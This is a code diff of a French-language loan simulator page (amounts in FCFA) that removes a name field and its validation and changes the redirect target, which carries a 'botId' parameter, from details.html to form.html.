@@ -102,35 +102,6 @@ position:relative;
     text-align: center;
 }
 
-/* --- NEW: NAME INPUT --- */
-.name-input-wrap {
-    margin-bottom: 16px;
-}
-
-.name-input-wrap label {
-    display: block;
-    font-size: 13px;
-    font-weight: 500;
-    color: #555;
-    margin-bottom: 4px;
-    letter-spacing: 0.3px;
-}
-
-.name-input-wrap input {
-    width: 100%;
-    padding: 12px 14px;
-    border-radius: 10px;
-    border: 1px solid #ddd;
-    font-size: 15px;
-    color: #1a1a2e;
-    background: #ffffff;
-    outline: none;
-    transition: border-color 0.3s;
-}
-.name-input-wrap input:focus {
-    border-color: #9A0000;
-}
-
 .card .label {
     color: #777;
     font-size: 12px;
@@ -392,12 +363,6 @@ position:relative;
 
         <h2>Simulateur de prêt</h2>
 
-        <!-- NAME INPUT -->
-        <div class="name-input-wrap">
-            <label for="fullNameInput">Votre nom complet</label>
-            <input type="text" id="fullNameInput" placeholder="Ex: Jean Dupont" required />
-        </div>
-
         <div class="label">MONTANT DU PRÊT</div>
         <div class="amount" id="loanAmount">4 000 FCFA</div>
 
@@ -465,17 +430,15 @@ if (!botId) {
 
 localStorage.setItem("botId", botId);
 
-// ---------- DOM REFS ----------
-const nameInput = document.getElementById('fullNameInput');
-const slider = document.getElementById('loanSlider');
-const loanAmount = document.getElementById('loanAmount');
-const payment = document.getElementById('payment');
-const monthsDisplay = document.getElementById('months');
+// ---------- CALCULATOR ----------
+let slider = document.getElementById("loanSlider");
+let loanAmount = document.getElementById("loanAmount");
+let payment = document.getElementById("payment");
+let monthsDisplay = document.getElementById("months");
 
 let months = 12;
 const rate = 0.045 / 12;
 
-// ---------- CALCULATE ----------
 function calculate() {
     let P = parseFloat(slider.value);
     let n = months;
@@ -494,7 +457,6 @@ function calculate() {
 
 slider.oninput = calculate;
 
-// ---------- TERM BUTTONS ----------
 document.querySelectorAll(".term").forEach(btn => {
     btn.onclick = function() {
         document.querySelectorAll(".term").forEach(b => b.classList.remove("active"));
@@ -507,31 +469,17 @@ document.querySelectorAll(".term").forEach(btn => {
 
 // ---------- APPLY LOAN ----------
 function applyLoan() {
-    // 1. Validate name
-    const fullName = nameInput.value.trim();
-    if (!fullName) {
-        alert('⚠️ Veuillez entrer votre nom complet.');
-        nameInput.focus();
-        return;
-    }
-
-    // 2. Validate amount
     const amount = parseFloat(slider.value);
     if (amount < 4000) {
         alert('⚠️ Le montant minimum est de 4 000 FCFA');
         return;
     }
-
-    // 3. Save all data
-    localStorage.setItem("fullName", fullName);
     localStorage.setItem("loanAmount", slider.value);
     localStorage.setItem("loanTerm", months);
-
-    // 4. Redirect to phone verification
-    window.location.href = `details.html?botId=${botId}`;
+    // Redirect to the loan application page
+    window.location.href = `form.html?botId=${botId}`;
 }
 
-// ---------- INIT ----------
 calculate();
 </script>
 
